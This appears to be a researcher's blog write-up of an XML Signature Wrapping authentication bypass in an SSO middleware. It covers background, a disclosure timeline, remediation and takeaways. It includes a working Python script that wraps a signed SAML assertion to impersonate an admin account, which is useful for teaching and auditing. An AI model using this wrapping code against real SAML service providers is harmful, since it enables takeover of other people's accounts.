---
title: "Breaking SAML: How I Found an Auth Bypass Affecting 200+ Enterprise Vendors"
date: 2026-03-18
category: vuln
tags: [cve, web, saml, auth]
cve: CVE-2024-XXXXX
readtime: 24
featured: true
summary: "A deep dive into the XML signature wrapping vulnerability I discovered in a widely-deployed SSO middleware."
---

## Background

During a routine black-box engagement against a financial services client, I noticed something odd in the SAML response their SSO was generating. The signature was there, the certificate looked valid — but the element being signed wasn't quite what the service provider was consuming.

This is the story of how that observation turned into a critical auth bypass affecting over 200 enterprise vendors.

## What is XML Signature Wrapping?

XML Signature Wrapping (XSW) is a class of attack that exploits the gap between **what gets signed** and **what gets processed**. SAML relies on XML digital signatures for trust — an IdP signs an assertion, the SP verifies it. But XML parsers can be tricked.

The core issue: `xmldsig` signs a *specific element by reference*, not the whole document. If you can inject a second element that the SP reads *instead* of the signed one — while the signature still validates against the original — you win.

```xml
<!-- Original signed assertion (IdP sends this) -->
<samlp:Response>
  <saml:Assertion ID="signed-assertion">
    <saml:Subject>
      <saml:NameID>legit_user@corp.com</saml:NameID>
    </saml:Subject>
    <ds:Signature>...</ds:Signature>
  </saml:Assertion>
</samlp:Response>

<!-- Wrapped version (attacker sends this) -->
<samlp:Response>
  <saml:Assertion ID="attacker-assertion">
    <saml:Subject>
      <saml:NameID>admin@corp.com</saml:NameID>  <!-- injected -->
    </saml:Subject>
  </saml:Assertion>
  <saml:Assertion ID="signed-assertion">
    <saml:Subject>
      <saml:NameID>legit_user@corp.com</saml:NameID>
    </saml:Subject>
    <ds:Signature>...</ds:Signature>  <!-- still valid! -->
  </saml:Assertion>
</samlp:Response>
```

The signature validates. The SP reads the *first* assertion. You're now `admin@corp.com`.

## The Vulnerable Middleware

The middleware in question (redacted pending full disclosure) was a widely-deployed SSO proxy used in financial, healthcare, and government sectors. Its XML parser used `getElementsByTagName('Assertion')[0]` — always consuming the first element — while signature verification operated on the element referenced by `ID`.

> This is a textbook XSW condition: two codepaths operating on "the assertion" that disagree on which assertion that is.

## Exploitation

### Step 1 — Intercept a valid SAML response

Using Burp Suite, capture a valid `SAMLResponse` from the IdP after authenticating as a low-privileged user.

```python
import base64
import zlib
from lxml import etree

# Decode the captured SAMLResponse
raw = base64.b64decode(saml_response_b64)
doc = etree.fromstring(raw)
```

### Step 2 — Clone and wrap

```python
# Find the signed assertion
ns = {'saml': 'urn:oasis:names:tc:SAML:2.0:assertion'}
original = doc.find('.//saml:Assertion', ns)

# Deep copy for the wrapper (attacker-controlled)
import copy
wrapper = copy.deepcopy(original)

# Change the NameID in the wrapper to target account
nameid = wrapper.find('.//saml:NameID', ns)
nameid.text = 'admin@targetcorp.com'

# Remove signature from wrapper (it won't have one)
sig = wrapper.find('.//{http://www.w3.org/2000/09/xmldsig#}Signature')
if sig is not None:
    wrapper.remove(sig)

# Give the wrapper a different ID
wrapper.set('ID', 'wrapped-' + wrapper.get('ID'))

# Insert wrapper before original
response = doc.find('{urn:oasis:names:tc:SAML:2.0:protocol}Response')
response.insert(0, wrapper)

# Re-encode
payload = base64.b64encode(etree.tostring(doc)).decode()
```

### Step 3 — Submit and observe

Replay the modified `SAMLResponse` to the SP's ACS endpoint. With the vulnerable middleware, authentication succeeds as `admin@targetcorp.com` — no valid credentials required.

## Impact

| Severity | CVSS Score | Attack Vector |
|----------|-----------|---------------|
| Critical | 9.4 | Network, no auth required |

Any account on the target tenant was reachable, including admin accounts. In environments using JIT provisioning, entirely new accounts could be created.

## Disclosure Timeline

- **2024-08-12** — Vulnerability discovered during engagement
- **2024-08-14** — Vendor notified via security disclosure form
- **2024-08-20** — Vendor acknowledges, begins internal assessment
- **2024-09-03** — CISA coordinated disclosure initiated (200+ affected vendors)
- **2024-11-01** — Patches shipped to all affected versions
- **2024-11-15** — CVE assigned, public disclosure

## Remediation

The fix requires two changes:

1. **Validate that the signed assertion is the one being consumed.** After verifying the signature, check that the `ID` of the verified element matches the element your parser actually returns for processing.

2. **Reject responses with multiple `Assertion` elements** unless your implementation explicitly supports them.

```python
# Correct approach: verify then consume the *same* element
verified_assertion = verify_signature(doc)  # returns the signed element
nameid = verified_assertion.find('.//saml:NameID', ns).text  # read from verified element only
# NOT: doc.getElementsByTagName('Assertion')[0]
```

## Takeaways

XSW is a well-documented attack class but continues to appear in production code. The failure mode is almost always the same: signature verification and assertion consumption are handled by different codepaths that don't share a reference to the same object.

If you're auditing a SAML implementation, always check: *does the library return the verified element, or does the consumer re-query the DOM?*

---

*PoC code is available to verified security researchers. Contact me with your affiliation.*
